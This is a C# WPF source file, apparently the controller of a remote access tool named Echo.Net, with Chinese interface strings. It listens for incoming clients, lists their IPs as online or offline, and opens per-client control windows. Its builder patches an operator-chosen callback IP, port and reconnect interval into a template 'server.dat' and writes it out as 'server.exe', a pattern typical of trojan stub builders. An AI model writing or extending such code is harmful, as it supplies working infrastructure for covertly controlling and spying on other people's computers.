using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Diagnostics;

namespace Echo.Net
{
    using System.ComponentModel;
    using System.IO;
    using System.Net;
    using System.Net.Sockets;
    using System.Threading;
    using System.Xml.Serialization;

    /// <summary>
    /// MainWindow.xaml 的交互逻辑
    /// </summary>
    public partial class Main : Window
    {
        TcpListener tcpListener;

        public Main()
        {
            InitializeComponent();
        }

        //BackgroundWorker bkg_Worker;
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            IP.Text = Properties.Settings.Default.Server_IP;
            Port.Text = Properties.Settings.Default.Server_Port;
            ReconnectSecond.Text = Properties.Settings.Default.ReconnectSecond;

            if (tcpListener == null && listener_start() == false)
            {
                Log("开启失败,端口被占用!");
                status1.Content = "";
                return;
            }
            Log("等待连接...\t端口:" + Properties.Settings.Default.Local_Port);
            status1.Content = "正在监听...";
            status2.Content = "端口:" + Properties.Settings.Default.Local_Port;

            tcpListener.BeginAcceptTcpClient(
                new AsyncCallback(DoAcceptTcpClientCallback),
                tcpListener);

            /*
            bkg_Worker = new BackgroundWorker();
            bkg_Worker.DoWork += Bkg_DoWork;
            bkg_Worker.RunWorkerAsync();
            */
        }
        /*
        //等待并处理服务端连接
        private void Bkg_DoWork(object sender, DoWorkEventArgs e)
        {
            if (Data.listener == null && listener_start() == false)
            {
                Log("开启失败,端口被占用!");
                return;
            }

            while (!bkg_Worker.CancellationPending)
            {

                Trace.WriteLine("等待连接");
                TcpClient tcpClient = Data.listener.AcceptTcpClient();

                Trace.WriteLine("建立连接");
                Handler handler = new Handler(tcpClient);
            }
        }
        */

        bool listener_start()
        {
            try
            {
                tcpListener = new TcpListener(IPAddress.Any, Properties.Settings.Default.Local_Port);
                tcpListener.Start();
            }
            catch (Exception)
            {
                tcpListener.Stop();
                tcpListener = null;
                return false;
            }
            return true;
        }

        void DoAcceptTcpClientCallback(IAsyncResult ar)
        {
            TcpListener listener = (TcpListener)ar.AsyncState;
            TcpClient tcpClient = listener.EndAcceptTcpClient(ar);

            Trace.WriteLine("建立连接 " + tcpClient.Client.RemoteEndPoint.ToString());
            Handler handler = new Handler(tcpClient, this);

            tcpListener.BeginAcceptTcpClient(
                new AsyncCallback(DoAcceptTcpClientCallback),
                tcpListener);
        }

        public void add_item(ServerPacket.Login login_info)
        {
            Log(login_info.IP + "\t上线");
            listView.Items.Add(login_info);
        }

        public void remove_item(ServerPacket.Login login_info)
        {
            if (login_info == null)
                return;
            Log(login_info.IP + "\t下线");
            listView.Items.Remove(login_info);
        }

        void Log(string str)
        {
            logBox.Text += DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "\t" + str + "\n";
            logBox.ScrollToEnd();
        }

        private void MenuItem_Click(object sender, RoutedEventArgs e)
        {
            if (listView.SelectedIndex == -1)
                return;
            ServerPacket.Login login = (ServerPacket.Login)listView.SelectedValue;
            Handler handler = (Handler)(login.handler);
            if (handler.tcpClient.Client.Connected == false)
            {
                Log(login.IP + "连接中断!");
                listView.Items.Remove(login);
                return;
            }
            MenuItem menuItem = (MenuItem)e.OriginalSource;
            handler.OpenWindow(menuItem.Name);
        }

        private void Window_Closing(object sender, CancelEventArgs e)
        {
            Application.Current.Shutdown();
        }

        private void ServerConfig_Click(object sender, RoutedEventArgs e)
        {
            Properties.Settings.Default.Server_IP = IP.Text;
            Properties.Settings.Default.Server_Port = Port.Text;
            Properties.Settings.Default.ReconnectSecond = ReconnectSecond.Text;
            Properties.Settings.Default.Save();

            string strcfg = IP.Text + "|" + Port.Text + "|" + ReconnectSecond.Text;
            string base64cfg = Convert.ToBase64String(Encoding.UTF8.GetBytes(strcfg));
            byte[] cfg = Encoding.UTF8.GetBytes(base64cfg);

            if (cfg.Length > 64)
            {
                MessageBox.Show("IP地址过长!");
                return;
            }

            byte[] bytes;
            try
            {
                FileStream fileStream = new FileStream("server.dat", FileMode.Open);
                bytes = new byte[fileStream.Length];
                fileStream.Read(bytes, 0, bytes.Length);
                fileStream.Close();
            }
            catch (Exception)
            {
                MessageBox.Show("server.dat文件不存在!");
                return;
            }

            int pos = 0, i, j;
            //Base64("127.0.0.1|60000|10")
            byte[] old = Encoding.UTF8.GetBytes("MTI3LjAuMC4xfDYwMDAwfDEw");
            for (i = 0; i < bytes.Length; i++)
            {
                if (bytes[i] != old[0])
                    continue;
                for (j = 0; j < old.Length; j++)
                    if (bytes[i + j] != old[j])
                        break;
                if (j == old.Length)
                {
                    pos = i;
                    break;
                }
            }
            if (pos == 0)
            {
                MessageBox.Show("server.dat文件有误!");
                return;
            }

            for (i = 0; i < cfg.Length; i++)
                bytes[pos + i] = cfg[i];
            for (i = 0; i < 64 - cfg.Length; i++)
                bytes[pos + cfg.Length + i] = 0x20;

            using (System.Windows.Forms.SaveFileDialog dlg = new System.Windows.Forms.SaveFileDialog())
            {
                dlg.FileName = "server.exe";
                dlg.Filter = "应用程序|*.exe|所有文件|*.*";
                if (dlg.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    try
                    {
                        FileStream fileStream2 = new FileStream(dlg.FileName, FileMode.Create);
                        fileStream2.Write(bytes, 0, bytes.Length);
                        fileStream2.Close();
                        MessageBox.Show("生成完毕!");
                    }
                    catch (Exception)
                    {
                        MessageBox.Show("创建失败,文件被占用!");
                    }
                }
            }
        }

    }
}
